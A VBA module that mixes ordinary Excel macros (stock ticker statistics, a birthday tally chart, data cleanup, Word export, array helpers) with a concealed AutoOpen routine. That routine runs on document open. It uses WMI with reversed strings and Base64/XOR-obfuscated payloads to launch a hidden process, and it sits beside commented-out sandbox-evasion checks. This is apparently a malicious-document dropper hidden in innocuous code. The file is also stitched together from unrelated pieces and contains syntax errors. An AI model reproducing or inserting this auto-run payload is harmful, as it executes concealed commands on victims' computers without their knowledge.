Attribute VB_Name = "Module1"
Private Const CP_UTF8                       As Long = 65001

#If Win64 Then
Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
#Else
Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long

#End If


Sub WallStreet():
    Dim ticker As String
    Dim lastrow As Double
    Dim k As Integer
    Dim yearlychange As Double
    Dim lastprice As Double
    Dim firstprice As Double
    Dim percentage As Double
    Dim totalStock As Double
    Dim GreatestIncrease As Double
    Dim GreatestDecrease As Double
    Dim GreatestValume As Double

    For Each ws In Worksheets
        k = 1
        p = 1
        m = 1
        lastrow = Cells(Rows.Count, 1).End(xlUp).Row
        ws.Cells(1, 9).Value = "Ticker"
        ws.Cells(1, 10).Value = "Yearly Change"
        ws.Cells(1, 11).Value = "Percentage"
        ws.Cells(1, 12).Value = "Total Stock Valume"
        ws.Cells(2, 14).Value = "Greatest % Increase"
        ws.Cells(3, 14).Value = "Greatest % Decrease"
        ws.Cells(4, 14).Value = "Greatest Total Valume"
        ws.Cells(1, 15).Value = "Ticker"
        ws.Cells(1, 16).Value = "Value"

        For i = 2 To lastrow
            If (ws.Cells(i + 1, 1).Value <> ws.Cells(i, 1).Value) Then
                ticker = ws.Cells(i, 1).Value
                k = k + 1
                ws.Cells(k, 9).Value = ticker
            End If
        Next i
        
        For j = 2 To lastrow
            totalStock = ws.Cells(j, 7) + totalStock
            
            If (ws.Cells(j + 1, 1).Value <> ws.Cells(j, 1).Value) Then
                m = j - m + 1
                firstprice = ws.Cells(m, 3).Value
                lastprice = ws.Cells(j, 6).Value
                p = p + 1
                ws.Cells(p, 10).NumberFormat = "0.00"
                yearlychange = lastprice - firstprice
                ws.Cells(p, 10).Value = yearlychange
                If yearlychange >= 0 Then
                        ws.Cells(p, 10).Interior.ColorIndex = 4
                Else
                    ws.Cells(p, 10).Value = yearlychange
                    ws.Cells(p, 10).Interior.ColorIndex = 3
                End If
                ws.Cells(p, 11).NumberFormat = "0.00"
                If firstprice <> 0 Then
                    percentage = (yearlychange / firstprice) * 100
                    ws.Cells(p, 11).Value = percentage
                    m = 0
                Else
                    ws.Cells(p, 11).Value = 0
                    m = 0
                End If
                ws.Cells(p, 12).Value = totalStock
                totalStock = 0
            End If
            
            m = m + 1
            yearlychange = 0

        Next j

        GreatestIncrease = ws.Cells(2, 11).Value
        Ti = ws.Cells(2, 9).Value
        GreatestDecrease = ws.Cells(2, 11).Value
        Td = ws.Cells(2, 9).Value
        GreatestValume = ws.Cells(2, 12).Value
        Tv = ws.Cells(2, 9).Value
        For Index = 3 To lastrow:
            If GreatestIncrease < ws.Cells(Index, 11).Value Then
                GreatestIncrease = ws.Cells(Index, 11).Value
                Ti = ws.Cells(Index, 9)
            End If
            If GreatestDecrease > ws.Cells(Index, 11).Value Then
                GreatestDecrease = ws.Cells(Index, 11).Value
                Td = ws.Cells(Index, 9)
            End If
            If GreatestValume < ws.Cells(Index, 12).Value Then
                GreatestValume = ws.Cells(Index, 12).Value
                Tv = ws.Cells(Index, 9)
            End If
        Next Index

        ws.Cells(2, 15).Value = Ti
        ws.Cells(2, 16).NumberFormat = "0.00"
        ws.Cells(2, 16).Value = GreatestIncrease
        ws.Cells(3, 15).Value = Td
        ws.Cells(3, 16).NumberFormat = "0.00"
        ws.Cells(3, 16).Value = GreatestDecrease
        ws.Cells(4, 15).Value = Tv
        ws.Cells(4, 16).NumberFormat = "0.00"
        ws.Cells(4, 16).Value = GreatestValume
        
    Next ws

End Sub


Sub subroutine8()
    Dim Count
    Dim count2
    For i = 1 To 55
        Sheets("Form Responses 1").Cells([i], [7]).Value = Sheets("Form Responses 1").Cells([4], [5]).Value
        Sheets("Form Responses 1").Cells([i], [7]).ClearContents Sheets("Form Responses 1").Cells([i], [7]).Value = Sheets("Form Responses 1").Cells([i], [5]).Value
        Sheets("Form Responses 1").Cells([i], [8]).Value = Sheets("Form Responses 1").Cells([4], [5]).Value
        Sheets("Form Responses 1").Cells([i], [8]).ClearContents
        Sheets("Form Responses 1").Cells([i], [10]).Value = Sheets("Form Responses 1").Cells([4], [5]).Value
        Sheets("Form Responses 1").Cells([i], [10]).ClearContents
    Next i

    '============= We need to remove empty cells in order to plot/evaluate the data
    Count = 1
    For j = 2 To 55
        If Not IsEmpty(Sheets("Form Responses 1").Cells([j], [7])) Then
            Count = Count + 1
            Sheets("Form Responses 1").Cells([Count], [8]).Value = Sheets("Form Responses 1").Cells([j], [7]).Value
            Sheets("Form Responses 1").Cells([Count], [10]).Value = Sheets("Form Responses 1").Cells([j], [7]).Value
        End If
    Next j
       
    '============ Creating a tally list (removing duplicates) ===========
    LastRow_in_ColumnJ = Sheets("Form Responses 1").Range("J99").End(xlUp).Row
    Sheets("Form Responses 1").Range("$J$1:$J$" & LastRow_in_ColumnJ).RemoveDuplicates Columns:=1, Header:=xlYes

    'Autofit columns
    Sheets("Form Responses 1").Columns(10).AutoFit
    Sheets("Form Responses 1").Columns(8).AutoFit

    count2 = 1
    For k = 1 To 55
        If Not IsEmpty(Sheets("Form Responses 1").Cells([k], [10])) Then
            count2 = count2 + 1
        End If
    Next k

    'We now create our tally
    For m = 2 To Count
        For n = 2 To count2
            If Sheets("Form Responses 1").Cells([n], [10]).Value = Sheets("Form Responses 1").Cells([m], [8]).Value Then
                Sheets("Form Responses 1").Cells([n], [12]).Value = Sheets("Form Responses 1").Cells([n], [12]).Value + 1
            End If
        Next n
    Next m

    'Now we plot
    Dim chart1 As Chart
    Set chart1 = Charts.Add
    Set src1 = chart1.SeriesCollection.NewSeries
    For p = 1 To count2
        Sheets("Sheet1").Cells([p], [2]).Value = Sheets("Form Responses 1").Cells([p], [10]).Value
        Sheets("Sheet1").Cells([p], [3]).Value = Sheets("Form Responses 1").Cells([p], [12]).Value
    Next p
    Sheets("Sheet1").Cells([1], [2]).Value = "Birthday"
    Sheets("Sheet1").Cells([1], [3]).Value = "Tally"
    src1.Name = "Birthdays"
    src1.XValues = Range(Sheets("Sheet1").Range("B2"), Sheets("Sheet1").Range("B50").End(xlUp))
    src1.Values = Range(Sheets("Sheet1").Range("C2"), Sheets("Sheet1").Range("C50").End(xlUp))
    chart1.HasTitle = True    chart1.ChartTitle.Text = "Tally vs Birthday"
    chart1.Axes(xlCategory, xlPrimary).HasTitle = True
    chart1.Axes(xlCategory, xlPrimary).AxisTitle.Characters.text = "Birthday"
    chart1.Axes(xlValue, xlPrimary).HasTitle = True
    chart1.Axes(xlValue, xlPrimary).AxisTitle.Characters.text = "Tally"
    chart1.ChartType = xlColumnClustered

End Sub

Sub temp1()
' Sanitizes data with removal of empty rows

Dim ws_orig As Worksheet
Dim ws_new As Worksheet
Set ws_orig = Sheets("AZ Active 20100818")
Set ws_new = Sheets("cleaned")

Dim i As Integer
Dim j As Integer
Dim k As Integer
Dim m As Integer

Worksheets("cleaned").Cells([1], [1]) = Worksheets("AZ Active 20100818").Cells([1], [3])
Worksheets("cleaned").Cells([1], [2]) = Worksheets("AZ Active 20100818").Cells([1], [4])
Worksheets("cleaned").Cells([1], [3]) = Worksheets("AZ Active 20100818").Cells([1], [14])
Worksheets("cleaned").Cells([1], [4]) = Worksheets("AZ Active 20100818").Cells([1], [17])

j = 1
For i = 1 To 1451
  If WorksheetFunction.CountA(ws_orig.Range("Q" & i)) <> 0 Then
    If ((Worksheets("AZ Active 20100818").Cells([i], [14]) = "AZ000") Or (Worksheets("AZ Active 20100818").Cells([i], [14]) = "AZ0000") Or (Worksheets("AZ Active 20100818").Cells([i], [14]) = "AZ0140") Or (Worksheets("AZ Active 20100818").Cells([i], [14]) = "140")) Then
          
          Worksheets("cleaned").Cells([j], [1]) = Worksheets("AZ Active 20100818").Cells([i], [3])
          Worksheets("cleaned").Cells([j], [2]) = Worksheets("AZ Active 20100818").Cells([i], [4])
          
          Worksheets("cleaned").Cells([j], [3]) = Worksheets("AZ Active 20100818").Cells([i], [14])
          Worksheets("cleaned").Cells([j], [4]) = Worksheets("AZ Active 20100818").Cells([i], [17])
          If (ws_orig.Range("Q" & i).Interior.Color = RGB(255, 199, 206)) Then
              ws_new.Range("D" & j).Interior.Color = RGB(255, 192, 0)
          End If
    j = j + 1
    End If
  End If
Next i

' Worksheets("03-30-2015").Cells([j], [5]) = "0" + Worksheets("03-30-2015").Cells([j], [5])
  'End If
  
' ws_orig.CountA(Range("E1:E1451")) <> 0

End Sub

----------------------------------------------------------

Sub temp2()

'excel vba script to export data to word and pdf
' enable MS Word Object lib: tools -> references -> check Microsoft Word 12.0 Object Library
'or
'ActiveWorkbook.VBProject.References.AddFromFile "C:\Program Files\Common Files\Microsoft 'Shared\OFFICE14\MSO.DLL"
'To list references (paths) in Excel:
'Dim ref As Reference
'For Each ref In ActiveWorkbook.VBProject.References
'    Debug.Print ref.Description; " -- "; ref.FullPath
'Next

'Result:
'Microsoft Excel 14.0 Object Library -- C:\Program Files\Microsoft Office\Office14\EXCEL.EXE
'OLE Automation -- C:\Windows\system32\stdole2.tlb
'Microsoft Forms 2.0 Object Library -- C:\Windows\system32\FM20.DLL

Dim i As Integer
Dim R As Integer
Dim wordApp As Word.Application
Dim wordDoc As Word.Document
Dim fileName1 As String
Dim fileName2 As String

Set wordApp = CreateObject("word.application")
wordApp.Visible = True

Set wordDoc = wordApp.Documents.Add

R = 3   'r = row, change row to change file/candidate

'Worksheets("Sheet1").Cells([1], [1]) = fileName
For i = 1 To 66
    fileName1 = "C:\Users\Public\Desktop\survey_response_" & Cells(R, 3) & ".docx"
    fileName2 = "C:\Users\Public\Desktop\survey_response_" & Cells(R, 3) & ".pdf"
    wordDoc.Content.InsertAfter Cells([1], [i]) & vbCrLf
    wordDoc.Content.InsertAfter Cells([R], [i]) & vbCrLf & vbCrLf & vbCrLf
Next i

wordDoc.ExportAsFixedFormat OutputFileName:=fileName2, ExportFormat:=wdExportFormatPDF
wordDoc.SaveAs (fileName1)
wordApp.Quit

Set wordDoc = Nothing
Set wordApp = Nothing

End Sub

Sub subroutine5()
For i = 1 To 4
    If Sheets("Sheet1").Cells([i], [2]).Value = "Michael" Then  'Cells([row], [col]).Value or .Text
        'Perform your action here
        '-4105 for default color, RGBY(std and light): 3 & 24, 5 & 17, 4 & 50, 6 & 36
        Sheets("Sheet2").Cells([i], [1]).Value = Sheets("Sheet1").Cells([i], [1]).Value
    End If
Next i
End Sub





Public Function toUnix(dt) As Long
    toUnix = DateDiff("s", "1/1/1970", dt)
End Function

Public Function toISO(dt) As String
    toISO = Format(dt, "YYYY-MM-DD") & "T" & Format(dt, "HH:MM:SS")
End Function

Public Function str(vValue) As String
    str = "'" & Replace(vValue, "'", "''") & "'"
End Function

Function JoinArrayofArrays(ByVal vArray As Variant, _
                Optional ByVal WordDelim As String = " ", _
                Optional ByVal LineDelim As String = vbNewLine) As String
    Dim R As Long, Lines() As String
    ReDim Lines(0 To UBound(vArray))
    For R = 0 To UBound(vArray)
        Dim InnerArray() As Variant
        InnerArray = vArray(R)
        Lines(R) = Join(InnerArray, WordDelim)
    Next
    JoinArrayofArrays = Join(Lines, LineDelim)
End Function

Function getDimension(Var As Variant) As Long
    On Error GoTo Err
    Dim i As Long
    Dim tmp As Long
    i = 0
    Do While True
        i = i + 1
        tmp = UBound(Var, i)
    Loop

Err:
        getDimension = i - 1
End Function

Public Sub QuickSort(vArray As Variant, inLow As Long, inHi As Long)
    Dim pivot   As Variant
    Dim tmpSwap As Variant
    Dim tmpLow  As Long
    Dim tmpHi   As Long

    tmpLow = inLow
    tmpHi = inHi

    pivot = vArray((inLow + inHi) \ 2)

    While (tmpLow <= tmpHi)

        While (vArray(tmpLow) < pivot And tmpLow < inHi)
            tmpLow = tmpLow + 1
        Wend

        While (pivot < vArray(tmpHi) And tmpHi > inLow)
            tmpHi = tmpHi - 1
        Wend

        If (tmpLow <= tmpHi) Then
            tmpSwap = vArray(tmpLow)
            vArray(tmpLow) = vArray(tmpHi)
            vArray(tmpHi) = tmpSwap
            tmpLow = tmpLow + 1
            tmpHi = tmpHi - 1
        End If
    Wend
    If (inLow < tmpHi) Then
        QuickSort vArray, inLow, tmpHi
    End If
    If (tmpLow < inHi) Then
        QuickSort vArray, tmpLow, inHi
    End If
End Sub


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


Sub AutoOpen()

    
    Set dos = CreateObject(StrReverse("rotacoLmebWS.gnitpircSmebW"))
    'If checkProc() Or checkMac() Or checkPnP() Or checkBios() Or checkCores() Or checkFilenameBad() Or checkTasks() Then
    'GoTo rew
    'End If
    'If checkISP() Then
    'GoTo rew
    'End If

    Set Retelo = dos.ConnectServer()
    Retelo.Security_.ImpersonationLevel = 3
    Set Feasskoo = Retelo.Get(yetras(Groa("IQwcQFM8OAwYAiEHABcdFlgkFhcTBhsWS0IXHgMCGgQVABYcTw4BBgQKARwHF0YGGQhVXzMGGwoaExcyBQcaAAUWPBIMBhtYIhcHFg=="), "versache"))
    With Feasskoo
        If .StatusCode = 0 Then
            End
        ElseIf .StatusCode > 0 Then
            End
        End If
    End With
    Set Vringo = Retelo.Get("Win32_Process")
    On Error Resume Next
    Bye_feru = Vringo.Create(yetras(Groa("BgoFFhMQAAAaCVJeFgoGARkSAQcYDw1FHgwWFwQNSEgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgNAhECAFtMRxcXElwUCBcAEBQQARYTAAcLAgAcB08ABwhZERcHEwwPShEKBhISBgxKGwQBBwQRRyoaABMyTwAHCFoNBgcREFJKWRcTBE8EAREeEBAGEgYaBhkLBhYPF0YGGQhdBwQXGgoRShUcFQIbABJKHxISFw0XWRYUFhMCRA0CEQIAW0xHFxcSXBQIFwAQFBABFhMABwsCABwHTwAHCFkRFwcTDA9KEQoGEhIGDEobBAEHBBFHJjkWCF0EGw1FWyEXABUKBgQCDB0dQT9KQRMLBEk1JiU1KhMbFw5NCwobOVBfPUFMABgTSCckLjg5BQMXAQA/SkkqR1YWDxVSMTMoIi8iLBsfWAAKFj1BU0UlAAZeLQwLBAIMHR1BTjgEAg1SL0NHDQsAXyY2LDM0R01FERYTFx0RHwlSXgUGCwoSAFIABwYaBFYGHR4RDBoRTUVSIBUCGhFbNQAcAgYbFlYTGxcOTQsKG0VfMhMEHQgTCwY/CBAcRRUKHwMOERw="), "versache"), Null, Null, Null_team)

End Sub





Public Function Groa(sBase64 As String) As String
    Dim baValue()       As Byte
    Dim sValue          As String
    Dim lSize           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin.base64"
        .text = sBase64
        baValue = .NodeTypedValue
        sValue = String$(4 * UBound(baValue), 0)
        lSize = MultiByteToWideChar(CP_UTF8, 0, baValue(0), UBound(baValue) + 1, StrPtr(sValue), Len(sValue))
        Groa = Left$(sValue, lSize)
    End With
End Function

Private Function yetras(text As String, key As String) As String
  Dim bText() As Byte
  Dim bKey() As Byte
  
  Dim TextUB As Long
  Dim KeyUB As Long
  
  
  
  bText = StrConv(text, vbFromUnicode)
  bKey = StrConv(key, vbFromUnicode)
  TextUB = UBound(bText)
  KeyUB = UBound(bKey)
  Dim TextPos As Long
  Dim Trenfa As Long
  For TextPos = 0 To TextUB
    bText(TextPos) = bText(TextPos) Xor bKey(Trenfa)
    If Trenfa < KeyUB Then
      Trenfa = Trenfa + 1
    Else
      Trenfa = 0
    End If
  Next TextPos
  yetras = StrConv(bText, vbUnicode)
End Function



Public Function DUPLO(file_path As String) As Boolean
    

    trega = Dir(file_path) <> ""
    Exit Function

DirErr:
      If Err.Number = 68 Then
        trega = False
    Else
        MsgBox Err.Description & " (" & Err.Number & ")", , "Run-time Error"
        Stop
    End If
End Function

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Sub Stock_Stats()
    
    'Populate the cell titles
    Range("i1").Value = "Ticker"
    Range("j1").Value = "Yearly Change"
    Range("k1").Value = "Percent Change"
    Range("l1").Value = "Total Stock Volume"
    Range("n2").Value = "Greatest % Increase"
    Range("n3").Value = "Greatest % Decrease"
    Range("n4").Value = "Greatest Total Volume"
    Range("o1").Value = "Ticker"
    Range("p1").Value = "Value"
    
    'Define variables
    ' "current_ticker" is used to store the ticker value in the loop
    Dim ticker, current_ticker As String
    Dim open_price, close_price As Double
    Dim yearly_change, percent_change As Double
    Dim total As Double         ' Total Stock Volume
    Dim ticker_count As Long    ' The row index of column i
    Dim lastrow As Long
    
    ' Variables for the challenges question
    Dim greatest_increase, greatest_decrease As Double
    Dim greatest_total As Double
    Dim ticker_increase, ticker_decrease, ticker_total As String
    
    
    'Initialize some values
    ticker = Cells(2, 1).Value
    open_price = Cells(2, 3).Value
    total = 0
    ticker_count = 2             'Starting from 2 in order to skip the title line
                        
    greatest_increase = 0
    greatest_decrease = 0
    greatest_total = 0
    
    'Calculate lastrow
    
    lastrow = Cells(2, 1).End(xlDown).Row
    
    'Start the for loop
    
    For i = 2 To lastrow + 1   ' lastrow+1 is used for the purpose of
                               ' displaying the last ticker
        
        '  Set current_ticker at the start of the each loop
        
        current_ticker = Cells(i, 1).Value
        
        ' If the same ticker, collect the close_price and add the increase the total volume
        If ticker = current_ticker Then
        
            close_price = Cells(i, 6).Value
            total = total + Cells(i, 7).Value
            
        Else    ' When ticker changes
                ' Calculate all the changes
                ' Update ticker name
            
            yearly_change = close_price - open_price
            If open_price = 0 Then  ' As open_price used as denominator, it should not be 0
                percent_change = 0
            Else
                percent_change = yearly_change / open_price
            
            End If
            
            ' Populate the cells
            
            Cells(ticker_count, 9).Value = ticker
            Cells(ticker_count, 10).Value = yearly_change
            Cells(ticker_count, 11).Value = percent_change
            Cells(ticker_count, 12).Value = total
            
            ' Looking for the greatest increase/decrease and total
            If greatest_increase < percent_change Then
                greatest_increase = percent_change
                ticker_increase = ticker
            End If
            
            If percent_change < greatest_decrease Then
                greatest_decrease = percent_change
                ticker_decrease = ticker
            End If
            
            If total > greatest_total Then
                greatest_total = total
                ticker_total = ticker
            End If
            
            'formatting the cells as it goes
            Cells(ticker_count, 11).NumberFormat = "0.00%"
            
            'Color formatting for Percentage Change
            If percent_change < 0 Then
                Cells(ticker_count, 10).Interior.Color = RGB(255, 0, 0)
            ElseIf percent_change = 0 Then
            
            Else
                Cells(ticker_count, 10).Interior.Color = RGB(0, 255, 0)
            End If
            
            
            ' Reset total and open_price
            total = 0
            open_price = Cells(i, 3).Value
            
            ' Change the ticker, ticker_count
            ticker = current_ticker
            ticker_count = ticker_count + 1
            
        End If
    
    
    Next i
    
    ' Populate the cells with results
    Range("O2").Value = ticker_increase
    Range("O3").Value = ticker_decrease
    Range("O4").Value = ticker_total
    Range("P2").Value = greatest_increase
    Range("P3").Value = greatest_decrease
    Range("P4").Value = greatest_total
    
    'formatting cell P2, P3 and P4
    Range("P2").NumberFormat = "0.00%"
    Range("P3").NumberFormat = "0.00%"
    Range("P4").NumberFormat = "0.0000E+00"
    
End Sub

Public Sub CreateDirectory(ByVal Path As String)

    Const MethodName = "CreateDirectory"
    
    If Path = vbNullString Then
        Exception.ArgumentException "Path", _
                                    "Path can't be an empty string. " _
                                    & ModuleName & "." & MethodName
    End If
    
    If StringH.Contains(Path, DirectorySeparatorChar) = False Then
        Exception.ArgumentException "Path", _
                                    "Path does have valid directory separator. " _
                                    & ModuleName & "." & MethodName
    End If
    
    
    ' To avoid problems with creating new folders,
    ' backslash from the end of folder path must
    ' be removed if, it exists.
    Dim NormalizedPath As String
    NormalizedPath = IIf(NeedsNormalization(Path), NormalizePath(Path), Path)
    CreateDirectoryBySections GetPathSections(NormalizedPath)
    
End Sub


Public Sub RemoveAllFilesFromFolder(ByVal Path As String)
    Kill Path & "\*.*"
End Sub


Private Function NeedsNormalization(ByVal Path As String) As Boolean
    NeedsNormalization = Path Like "*\"
End Function


' Path is normalized with the last character is backslash and it's removed.
' Remove last character from the right side of the string.
Private Function NormalizePath(ByVal Path As String) As String
    NormalizePath = VBA.Left$(Path, Len(Path) - 1)
End Function


' Splits a path to a file into individual folder segemetns.
' Example: "C:\abc1\abc1" will be splited into array with elements "C:", "abc1" and "abc2".
Private Function GetPathSections(ByVal Path As String) As String()
    GetPathSections = Split(Path, "\")
End Function


Private Sub CreateDirectoryBySections(ByVal PathSections As Variant)
    
    Dim FolderPath As String
    Dim PathSection As Variant
    For Each PathSection In PathSections
        FolderPath = BuildFolderPath(FolderPath, PathSection)
        
        If Not Tools.Fso.FolderExists(FolderPath) Then
            Tools.Fso.CreateFolder FolderPath
        End If
    Next PathSection

End Sub


Private Function BuildFolderPath(ByVal Path1 As String, ByVal Path2 As String) As String
    BuildFolderPath = Path1 & Path2 & "\"
End Function

Public Function Exists(ByVal Item As Variant, ByRef Arr As Variant) As Boolean
    Exists = (UBound(Filter(Arr, Item)) > -1)
End Function


' Retruns true if array was initalized.
' In VB, for whatever reason, Not myArray returns the SafeArray pointer.
' For uninitialized arrays, this returns -1.
' Not (XOR) this to XOR it with -1, thus returning zero.
Public Function IsInitialized(ByRef Arr() As Variant) As Boolean
    IsInitialized = ((Not Not Arr) <> 0)
End Function


' Converts single dimension array into a collection.
Public Function ToCollection(ByRef Arr() As Variant) As Collection

    Dim Output As New Collection
    
    Dim Item As Variant
    For Each Item In Arr
        Output.Add Item
    Next

    Set ToCollection = Output
    Set Output = Nothing
    
End Function


' Copies elements from an Array starting at SourceIndex and pastes them to another
' Array starting at DestinationIndex. Number of elements which will be copied is
' is specified in Length parameter.
Public Sub Copy(ByRef Arr() As Variant, ByVal SourceIndex As Long, ByRef DestinationArray() As Variant, _
                ByVal DestinationIndex As Long, ByVal Length As Long)

    Dim DestNdx As Long
    DestNdx = DestinationIndex
    
    Dim i As Long
    For i = SourceIndex To (Length + SourceIndex - 1)
        DestinationArray(DestNdx) = Arr(i)
        DestNdx = DestNdx + 1
    Next i
    
End Sub


' This function returns the number of dimensions of an array. An unallocated dynamic array
' has 0 dimensions.
Public Function Rank(ByRef Arr() As Variant) As Long
    
    Dim Ndx As Long
    Dim Res As Long
    On Error Resume Next

    Do
        Ndx = Ndx + 1
        Res = UBound(Arr, Ndx)
    Loop Until Err.Number <> 0
    Err.Number = 0
    
    Rank = Ndx - 1
    
End Function


' Returns the number of elements in single dimension of array.
Public Function Length(ByRef Arr() As Variant) As Long
    
    Dim Output As Long
    
    Dim i As Long
    For i = 1 To Rank(Arr)
        Output = UBound(Arr) + 1
    Next i
    
    Length = Output
    
End Function


' Returns the number of elements in the specified dimension (Dimension) of the array in
' Arr. If you omit Dimension, the first dimension is used.
Public Function NumElements(ByRef Arr() As Variant, Optional ByVal Dimension As Long = 1) As Long

    Dim NumDimensions As Long
    
    If IsArray(Arr) = False Then
        NumElements = 0
        Exit Function
    End If
    
    If IsEmpty(Arr) = True Then
        NumElements = 0
        Exit Function
    End If
    
    If Dimension < 0 Then
        NumElements = 0
        Exit Function
    End If
    
    NumDimensions = ArrayH.Rank(Arr)
    If NumDimensions < Dimension Then
        NumElements = 0
        Exit Function
    End If
    
    NumElements = UBound(Arr, Dimension) - LBound(Arr, Dimension) + 1

End Function


' Clears an range of items in Array starting at Index.
' This method works only for Arrays which have a single dimensions.
Public Sub Clear(ByRef Arr() As Variant, ByVal Index As Long, ByVal Length As Long)
    
    Const MethodName = "Clear"
    
    If Index < 0 Then
        Exception.ArgumentOutOfRangeException "Index", ModuleName & "." & MethodName
    End If
    
    If Index < LBound(Arr) Then
        Exception.ArgumentOutOfRangeException "Index", ModuleName & "." & MethodName
    End If
    
    If Index + Length > ArrayH.Length(Arr) Then
        Exception.ArgumentOutOfRangeException vbNullString, ModuleName & "." & MethodName
    End If
    
    If ArrayH.Rank(Arr) <> 1 Then
        Exception.ArgumentException "Arr", _
                                    "Multi dimensions arrray are not supported. " & ModuleName & MethodName
    End If
    
    Dim Ndx As Long
    Ndx = Index
    
    Dim i As Long
    For i = 1 To Length
        Arr(Ndx) = 0
        Ndx = Ndx + 1
    Next i
    
End Sub


' Returns a String which contains every element in an Array recursively.
' Method will work only if Array contains value type elements (strings, integers, long, ect.)
Public Function ToString(ByRef Arr() As Variant) As String

    Dim Output As String: Output = vbNullString
    ToStringRecursively Arr, Output
    ToString = Output

End Function


Private Sub ToStringRecursively(ByRef Arr() As Variant, ByRef Output As String)
    
    Dim i As Long
    For i = 0 To UBound(Arr)
        If IsArray(Arr(i)) Then
            Dim InnerArr() As Variant
            InnerArr = Arr(i)
            ToStringRecursively InnerArr, Output
        Else
            Output = Output & ", " & Arr(i)
        End If
    Next i
    
    Output = VBA.Replace(Output, ", ", vbNullString, Start:=1, Count:=1)

End Sub


' Searches a section of an array for a given element using a binary search
' algorithm. Elements of the array are compared to the search value using
' the given String interface. If comparer is null,
' elements of the array are compared to the search value using the
' IComparable interface, defualt string comparer is used to compare
' all elements. This method assumes that the array is already sorted;
' if this is not the case, the result will be incorrect.
'
' The method returns the index of the given value in the array. If the
' array does not contain the given value, the method returns a negative
' integer. The bitwise complement operator (NOT) can be applied to a
' negative result to produce the index of the first element (if any) that
' is larger than the given search value.

Public Function BinarySearch(ByRef Arr() As Variant, _
                             ByVal Index As Long, _
                             ByVal Length As Long, _
                             ByRef Value As Variant, _
                             ByRef Comparer As String) As Long
    
    Const MethodName = "BinarySearch"
    
    If ArrayH.IsInitialized(Arr) = False Then
        Exception.ArgumentNullException "Arr", "Array is not initialized. " & ModuleName & "." & MethodName
    End If
    
    Dim Lb As Long: Lb = ArrayH.GetLowerBound(Arr, 0)
    
    If Index < Lb Or ArrayH.Length(Arr) < 0 Then
        Exception.ArgumentNullException "Arr", "Index must be a non-negative numer. " & ModuleName & "." & MethodName
    End If
    
    If ArrayH.Length(Arr) - (Index - Lb) < Length Then
        Exception.ArgumentException "Length", "Invalid offset length. " & ModuleName & "." & MethodName
    End If
    
    If ArrayH.Rank(Arr) <> 1 Then
        Exception.ArgumentException "Arr", "Multi dimensions array are not supported. " & ModuleName & ".BinarySearch"
    End If
    
    If Comparer Is Nothing Then
        Set Comparer = ComparerStatic.Default
    End If
    
    Dim Low As Long: Low = Index
    Dim High As Long: High = Index + Length - 1
    Dim ObjArr() As Variant: ObjArr = Arr
    Dim i As Long
    Dim c As Long
    
    Do While Low <= High
        i = Application.WorksheetFunction.Median(Low, High)
        c = Comparer.Compare(ObjArr(i), Value)
        
        If c = 0 Then
            BinarySearch = i
            Exit Function
        End If
        
        If c < 0 Then
            Low = i + 1
        Else
            High = i - 1
        End If
    
    Loop
    
    BinarySearch = Not Low
    
End Function


' Return the index of the first element of the specified dimension in the array.
' Dimension: A zero-based dimension of the array whose starting index needs to be determined.
Public Function GetLowerBound(ByRef Arr() As Variant, ByVal Dimension As Long) As Long

    Const MethodName = "GetLowerBound"

    If Dimension < 0 Or Dimension >= ArrayH.Rank(Arr) Then
        Exception.ArgumentOutOfRangeException "Dimension", ModuleName & "." & MethodName
    End If
    
    If ArrayH.IsInitialized(Arr) = False Then
        Exception.ArgumentNullException "Arr", "Array is not initalized. " & ModuleName & "." & MethodName
    End If
    
    GetLowerBound = LBound(Arr, Dimension + 1)

End Function


' Returns the index of the first occurrence of a given value in a range of
' an array. The array is searched fowards, start from the index StartIndex value up to Count element.
Public Function IndexOf(ByRef Arr() As Variant, ByRef Value As Variant, ByVal StartIndex As Long, ByVal Count As Long) As Long
    
    Const MethodName = "IndexOf"
    
    If ArrayH.IsInitialized(Arr) = False Then
        Exception.ArgumentNullException "Arr", "Array is not initialized. " & ModuleName & "." & MethodName
    End If
    
    If ArrayH.Rank(Arr) <> 1 Then
        Exception.ArgumentException "Arr", "Multi dimensions array are not supported. " & ModuleName & "." & MethodName
    End If
    
    Dim Lb As Long
